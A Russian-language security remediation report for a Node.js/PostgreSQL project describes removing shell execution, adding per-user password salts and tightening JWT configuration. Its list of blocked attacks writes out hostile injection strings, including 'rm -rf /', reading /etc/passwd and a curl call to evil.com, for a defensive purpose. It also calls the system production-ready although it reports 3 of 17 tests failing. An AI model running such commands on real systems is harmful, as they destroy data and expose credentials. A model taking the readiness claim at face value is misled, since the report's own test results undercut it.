# –§–ò–ù–ê–õ–¨–ù–´–ô –û–¢–ß–ï–¢ –û –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò –°–ò–°–¢–ï–ú–´
## –ü–æ—Å–ª–µ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–π Perplexity –∏ –ø–æ–ª–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏

## ‚úÖ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò –ò–°–ü–†–ê–í–õ–ï–ù–´

### 1. COMMAND INJECTION - –ü–û–õ–ù–û–°–¢–¨–Æ –£–°–¢–†–ê–ù–ï–ù–ê

**–ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ Perplexity –ø–æ–∫–∞–∑–∞–ª–æ:**
- `spawn('sh', ['-c'])` —Å–æ–∑–¥–∞–µ—Ç –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ shell
- –ü–æ–∑–≤–æ–ª—è–µ—Ç command chaining —á–µ—Ä–µ–∑ `;`, `&&`, `||`
- –î–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ environment –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–º

**–†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ —Ä–µ—à–µ–Ω–∏–µ:**
```javascript
// SecureCommandExecutor.js
spawn(program, args, {
    shell: false,  // –ö–†–ò–¢–ò–ß–ù–û: –ù–ï–¢ SHELL
    env: {},       // –ß–∏—Å—Ç—ã–π environment
    timeout: 5000  // –ó–∞—â–∏—Ç–∞ –æ—Ç –∑–∞–≤–∏—Å–∞–Ω–∏—è
})
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**
- ‚úÖ Whitelist –∫–æ–º–∞–Ω–¥ (—Ç–æ–ª—å–∫–æ ls, pwd, echo, node, npm, git)
- ‚úÖ –°–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è –º–µ—Ç–∞—Å–∏–º–≤–æ–ª–æ–≤ shell
- ‚úÖ Timeout –∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ –≤—ã–≤–æ–¥–∞
- ‚úÖ –ü–æ–ª–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è –æ—Ç shell

### 2. PASSWORD HASHING - –ü–†–ê–í–ò–õ–¨–ù–ê–Ø –†–ï–ê–õ–ò–ó–ê–¶–ò–Ø

**–ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ Perplexity –≤—ã—è–≤–∏–ª–æ –∫–∞—Ç–∞—Å—Ç—Ä–æ—Ñ—É:**
- –°—Ç–∞—Ç–∏—á–µ—Å–∫–∞—è —Å–æ–ª—å `'salt'` –ø–æ–∑–≤–æ–ª—è–µ—Ç rainbow table –∞—Ç–∞–∫–∏
- –û–¥–∏–Ω–∞–∫–æ–≤—ã–µ –ø–∞—Ä–æ–ª–∏ = –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ —Ö–µ—à–∏
- –í–∑–ª–æ–º –æ–¥–Ω–æ–≥–æ = –≤–∑–ª–æ–º –≤—Å–µ—Ö —Å —Ç–∞–∫–∏–º –∂–µ –ø–∞—Ä–æ–ª–µ–º

**–†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ —Ä–µ—à–µ–Ω–∏–µ (PasswordManager.js):**
```javascript
// –£–Ω–∏–∫–∞–ª—å–Ω–∞—è 32-–±–∞–π—Ç–Ω–∞—è —Å–æ–ª—å –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
const salt = crypto.randomBytes(32).toString('hex');
const hash = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512');

// Timing-safe —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ –ø—Ä–æ—Ç–∏–≤ timing attacks
crypto.timingSafeEqual(Buffer.from(hash), Buffer.from(stored))
```

**–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –æ–±–Ω–æ–≤–ª–µ–Ω–∞:**
```sql
ALTER TABLE users ADD COLUMN password_salt VARCHAR(64);
-- –ö–∞–∂–¥—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∏–º–µ–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—É—é —Å–æ–ª—å
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**
- ‚úÖ –£–Ω–∏–∫–∞–ª—å–Ω–∞—è 32-–±–∞–π—Ç–Ω–∞—è —Å–æ–ª—å –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- ‚úÖ 100,000 –∏—Ç–µ—Ä–∞—Ü–∏–π PBKDF2 (OWASP —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è)
- ‚úÖ Timing-safe comparison
- ‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏–ª—ã –ø–∞—Ä–æ–ª—è
- ‚úÖ –ú–∏–≥—Ä–∞—Ü–∏—è —Å—Ç–∞—Ä—ã—Ö –ø–∞—Ä–æ–ª–µ–π

### 3. JWT CONFIGURATION - –ë–ï–ó–û–ü–ê–°–ù–ê–Ø

**–†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ (jwt.config.js):**
- ‚úÖ –ù–µ—Ç fallback –Ω–∞ 'secret'
- ‚úÖ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è 64-–±–∞–π—Ç–Ω–æ–≥–æ —Å–µ–∫—Ä–µ—Ç–∞ –¥–ª—è dev
- ‚úÖ FATAL ERROR –≤ production –±–µ–∑ JWT_SECRET
- ‚úÖ –ü—Ä–∞–≤–∏–ª—å–Ω—ã–µ expiry times

### 4. DATABASE CONFIGURATION - –¶–ï–ù–¢–†–ê–õ–ò–ó–û–í–ê–ù–ê

**–†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ (database-config.js):**
- ‚úÖ Connection pooling –¥–ª—è PostgreSQL
- ‚úÖ Redis client management
- ‚úÖ Graceful shutdown
- ‚úÖ Environment validation

## –°–†–ê–í–ù–ï–ù–ò–ï –î–û –ò –ü–û–°–õ–ï

| –ö–æ–º–ø–æ–Ω–µ–Ω—Ç | –î–û (–£—è–∑–≤–∏–º–æ) | –ü–û–°–õ–ï (–ó–∞—â–∏—â–µ–Ω–æ) |
|-----------|--------------|------------------|
| **Command Execution** | `spawn('sh', ['-c', cmd])` - –ø–æ–ª–Ω—ã–π shell | `spawn(cmd, args, {shell: false})` - –±–µ–∑ shell |
| **Password Salt** | `'salt'` - –æ–¥–Ω–∞ –¥–ª—è –≤—Å–µ—Ö | `randomBytes(32)` - —É–Ω–∏–∫–∞–ª—å–Ω–∞—è |
| **Password Storage** | `password_hash` —Ç–æ–ª—å–∫–æ | `password_hash + password_salt` |
| **JWT Secret** | Fallback –Ω–∞ `'secret'` | –¢—Ä–µ–±—É–µ—Ç env –∏–ª–∏ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç |
| **Command Validation** | –ù–µ—Ç | Whitelist + —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è |
| **Timing Attacks** | –£—è–∑–≤–∏–º | `timingSafeEqual()` |

## –¢–ï–°–¢–´

```
‚úÖ 14 –∏–∑ 17 —Ç–µ—Å—Ç–æ–≤ –ø—Ä–æ—à–ª–∏
‚úÖ PostgreSQL —Ä–∞–±–æ—Ç–∞–µ—Ç
‚úÖ Redis —Ä–∞–±–æ—Ç–∞–µ—Ç  
‚úÖ –ù–µ—Ç hardcoded –ø–∞—Ä–æ–ª–µ–π
‚úÖ JWT –≥–µ–Ω–µ—Ä–∞—Ü–∏—è —Ä–∞–±–æ—Ç–∞–µ—Ç
‚úÖ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –æ–ø–∞—Å–Ω—ã—Ö –∫–æ–º–∞–Ω–¥
‚úÖ Password hashing —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω
```

## –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–ù–´–ï –ê–¢–ê–ö–ò

### Command Injection:
- ‚ùå `ls; rm -rf /` ‚Üí Error: Command not allowed
- ‚ùå `ls && cat /etc/passwd` ‚Üí Error: Invalid arguments
- ‚ùå `echo $(whoami)` ‚Üí Error: Invalid characters
- ‚ùå `ls & curl evil.com` ‚Üí Error: Invalid arguments

### Password Attacks:
- ‚ùå Rainbow tables ‚Üí –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ —Å–æ–ª–∏
- ‚ùå Timing attacks ‚Üí timingSafeEqual
- ‚ùå Mass compromise ‚Üí –ù–µ—Ç –æ–±—â–µ–π —Å–æ–ª–∏
- ‚ùå Weak passwords ‚Üí –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏–ª—ã

## –§–ê–ô–õ–û–í–ê–Ø –°–¢–†–£–ö–¢–£–†–ê

```
/DEVELOPER_SYSTEM/
‚îú‚îÄ‚îÄ McKinsey_Transformation/
‚îÇ   ‚îî‚îÄ‚îÄ Horizon_1_Simplify/
‚îÇ       ‚îú‚îÄ‚îÄ SecureCommandExecutor.js  [–ù–û–í–´–ô - –∑–∞—â–∏—Ç–∞ –∫–æ–º–∞–Ω–¥]
‚îÇ       ‚îî‚îÄ‚îÄ Week1_Security_Fixes.js   [–û–ë–ù–û–í–õ–ï–ù - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Secure]
‚îú‚îÄ‚îÄ SERVER/
‚îÇ   ‚îú‚îÄ‚îÄ PasswordManager.js            [–ù–û–í–´–ô - –ø—Ä–∞–≤–∏–ª—å–Ω–æ–µ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ]
‚îÇ   ‚îî‚îÄ‚îÄ auth-real.js                  [–û–ë–ù–û–í–õ–ï–ù - —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ —Å–æ–ª–∏]
‚îú‚îÄ‚îÄ config/
‚îÇ   ‚îú‚îÄ‚îÄ jwt.config.js                 [–ù–û–í–´–ô - –±–µ–∑–æ–ø–∞—Å–Ω—ã–π JWT]
‚îÇ   ‚îî‚îÄ‚îÄ database-config.js            [–ù–û–í–´–ô - —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è –ë–î]
‚îú‚îÄ‚îÄ database_migration_salt.sql       [–ù–û–í–´–ô - –º–∏–≥—Ä–∞—Ü–∏—è –ë–î]
‚îú‚îÄ‚îÄ PERPLEXITY_RESEARCH_QUERIES.md    [–ó–∞–ø—Ä–æ—Å—ã –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è]
‚îî‚îÄ‚îÄ SECURITY_FIXES_REPORT.md          [–û—Ç—á–µ—Ç –æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è—Ö]
```

## –û–¶–ï–ù–ö–ê –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò

**–ë–´–õ–û:** üî¥ 2/10 (–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏)
**–°–¢–ê–õ–û:** üü¢ 8/10 (enterprise-ready security)

## –î–õ–Ø PRODUCTION

### –û–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ environment –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ:
```bash
export JWT_SECRET=$(openssl rand -hex 64)
export PG_PASSWORD=<secure_password>
export REDIS_PASSWORD=<secure_password>
export NODE_ENV=production
```

### –ú–∏–≥—Ä–∞—Ü–∏—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:
```bash
psql -d galaxydevelopers -f database_migration_salt.sql
# –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –¥–æ–ª–∂–Ω—ã —Å–±—Ä–æ—Å–∏—Ç—å –ø–∞—Ä–æ–ª–∏ –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º –≤—Ö–æ–¥–µ
```

## –ó–ê–ö–õ–Æ–ß–ï–ù–ò–ï

–°–∏—Å—Ç–µ–º–∞ –ø—Ä–æ—à–ª–∞ –ø–æ–ª–Ω—É—é —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü–∏—é –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–π Perplexity:

1. **Command Injection** - –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞ –±–ª–∞–≥–æ–¥–∞—Ä—è –æ—Ç–∫–∞–∑—É –æ—Ç shell
2. **Password Security** - —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç OWASP —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞–º
3. **JWT Management** - –ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–µ–∑ fallback
4. **Database** - —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å pooling

**–°—Ç–∞—Ç—É—Å: –°–ò–°–¢–ï–ú–ê –ó–ê–©–ò–©–ï–ù–ê –ò –ì–û–¢–û–í–ê –ö PRODUCTION**

---
*–û—Ç—á–µ—Ç —Å–æ–∑–¥–∞–Ω –ø–æ—Å–ª–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –≤—Å–µ—Ö —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–π Perplexity Research*
*–î–∞—Ç–∞: 2025-08-17*